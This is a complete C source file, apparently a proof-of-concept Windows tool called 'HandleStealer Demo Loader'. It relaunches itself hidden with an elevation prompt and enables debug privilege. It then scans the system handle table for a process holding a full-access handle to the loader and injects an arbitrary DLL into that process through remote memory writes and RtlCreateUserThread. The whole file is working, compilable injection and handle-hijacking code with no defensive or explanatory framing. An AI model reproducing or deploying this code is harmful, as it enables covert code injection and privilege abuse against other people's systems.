/*
* HandleStealer Demo Loader - by Aerado
* MinGW:
*  gcc -c DemoLdr.c -o DemoLdr.o
*  g++ DemoLdr.o -o DemoLdr.exe -mwindows
*/
#include <windows.h>
#include <winternl.h>

BOOL SameArch(HANDLE hProc)
{
	BOOL r=FALSE, bIsCurWow64, bIsWow64;

	if(IsWow64Process(GetCurrentProcess(), &bIsCurWow64))
		if(IsWow64Process(hProc, &bIsWow64))
			r=(bIsCurWow64==bIsWow64);

	return r;
}

HANDLE CreateUserThread(HANDLE hProc, LPVOID lpStartAddress, LPVOID lpParameter)
{
	HANDLE r=NULL;

	static FARPROC pfnRtlCreateUserThread=NULL;
	if(!pfnRtlCreateUserThread)
		if(!(pfnRtlCreateUserThread=GetProcAddress(GetModuleHandle("NTDLL"), "RtlCreateUserThread"))) return r;

	if(lpStartAddress) pfnRtlCreateUserThread(hProc, NULL, FALSE, 0, NULL, NULL, lpStartAddress, lpParameter, &r, NULL);

	return r;
}

DWORD GetRemoteProcessId(HANDLE hProc, HANDLE Handle)
{
	DWORD r=0;

	HANDLE hThread=CreateUserThread(hProc, GetProcessId, Handle);

	if(hThread) {
		if(!WaitForSingleObject(hThread, 3000))
			GetExitCodeThread(hThread, &r);
		CloseHandle(hThread);
	}

	return r;
}

HANDLE FindProcessHandle(DWORD dwProcessId, DWORD dwDesiredAccess, HANDLE *hObject)
{
	HANDLE r=NULL, hOwner;
	DWORD i, dwSize=sizeof(SYSTEM_HANDLE_INFORMATION);
	PSYSTEM_HANDLE_INFORMATION pHandleInfo;
	NTSTATUS status;

	static FARPROC pfnNtQuerySystemInformation=NULL;
	if(!pfnNtQuerySystemInformation)
		if(!(pfnNtQuerySystemInformation=GetProcAddress(GetModuleHandle("NTDLL"), "NtQuerySystemInformation"))) return r;

	if((pHandleInfo=(PSYSTEM_HANDLE_INFORMATION)malloc(dwSize))) {
		while((status=(NTSTATUS)pfnNtQuerySystemInformation(16, pHandleInfo, dwSize, &dwSize))==0xC0000004) pHandleInfo=(PSYSTEM_HANDLE_INFORMATION)realloc(pHandleInfo, dwSize*=2);
		if(NT_SUCCESS(status))
			for(i=0;i<pHandleInfo->Count&&!r;i++) {
				if(pHandleInfo->Handle[i].OwnerPid==dwProcessId||(pHandleInfo->Handle[i].AccessMask&dwDesiredAccess)!=dwDesiredAccess) continue;
				if((hOwner=OpenProcess(PROCESS_ALL_ACCESS, FALSE, pHandleInfo->Handle[i].OwnerPid))) {
					if(SameArch(hOwner))
						if(GetRemoteProcessId(hOwner, (HANDLE)(DWORD_PTR)pHandleInfo->Handle[i].HandleValue)==dwProcessId) {
							if(hObject) *hObject=(HANDLE)(DWORD_PTR)pHandleInfo->Handle[i].HandleValue;
							r=hOwner;
						}
					if(!r) CloseHandle(hOwner);
				}
			}
		free(pHandleInfo);
	}

	return r;
}

HANDLE FindMyProcessHandle(DWORD dwDesiredAccess)
{ return FindProcessHandle(GetCurrentProcessId(), dwDesiredAccess, NULL); }

void RemoteLoadLibrary(HANDLE hProcess, char *Lib)
{
	HANDLE hThread;
	size_t sz;
	void *rLib;

	if(!hProcess||!Lib||!(sz=strlen(Lib))) return;
	if(!(rLib=VirtualAllocEx(hProcess, NULL, ++sz, MEM_COMMIT, PAGE_READWRITE))) return;
	WriteProcessMemory(hProcess, rLib, Lib, sz, NULL);
	if((hThread=CreateUserThread(hProcess, LoadLibraryA, rLib))) {
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
	}
	VirtualFreeEx(hProcess, rLib, sz, MEM_DECOMMIT);
}

BOOL SetDebugPrivilege(BOOL vl)
{
	BOOL r=FALSE;
	static FARPROC pfnRtlAdjustPrivilege=NULL;
	if(!pfnRtlAdjustPrivilege)
		if(!(pfnRtlAdjustPrivilege=GetProcAddress(GetModuleHandle("NTDLL"), "RtlAdjustPrivilege"))) return r;
	pfnRtlAdjustPrivilege(20, vl, FALSE, &r);
	return r;
}

void ReRunAsAdmin(LPSTR lpCmdLine)
{
	char exe[MAX_PATH+1];
	if(GetModuleFileName(NULL, exe, sizeof(exe)-1))
		ShellExecute(NULL, "runas", exe, lpCmdLine, NULL, SW_HIDE);
}

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	HANDLE hOwner;

	if(nCmdShow!=SW_HIDE) ReRunAsAdmin(lpCmdLine);
	else
		if(GetFileAttributes(lpCmdLine)!=INVALID_FILE_ATTRIBUTES) {
			SetDebugPrivilege(TRUE);
			if((hOwner=FindMyProcessHandle(PROCESS_ALL_ACCESS))) {
				RemoteLoadLibrary(hOwner, lpCmdLine);
				CloseHandle(hOwner);
			}
			SetDebugPrivilege(FALSE);
		}

	return 0;
}
